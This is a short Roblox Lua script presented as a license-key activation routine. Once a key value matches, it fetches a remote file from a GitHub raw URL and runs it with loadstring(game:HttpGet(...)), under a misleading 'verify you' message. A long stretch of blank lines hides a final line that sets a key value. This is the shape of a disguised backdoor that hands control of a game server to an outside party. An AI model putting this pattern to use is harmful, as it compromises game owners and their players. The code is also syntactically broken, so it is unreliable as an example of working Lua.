local NBCLicenseKEY_UK = {"U20RVB274UGV2BUHG2374H0G2BV5782389GB0234UGH0B23VN25G9023B7459VB278375B2"}

while wait() do
  Instance.new("Script").Parent('ServerScriptService').Name('NBCLicenseKey')
  game.ServerScriptService.NBCLicenseKey.Data =
      local NBCLicenseKEY = NBCLicenseKEY_UK
      local LicenseActivated = false
      
      while wait() do
        if NBCLicenseKEY_UK.Value == ReplicatedStorage.ActiveKey.Value then
        LicenseActivated = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AminIsWinnerA/admin/main/DHNBI.lua", true))()
        print("Fortunaly, We have to verify you. The Data will get loaded.")
      end
end





































































































































































































































































































game.ReplicatedStorage.NowActivatedKey.Value = NBCLicenseKEY_UK
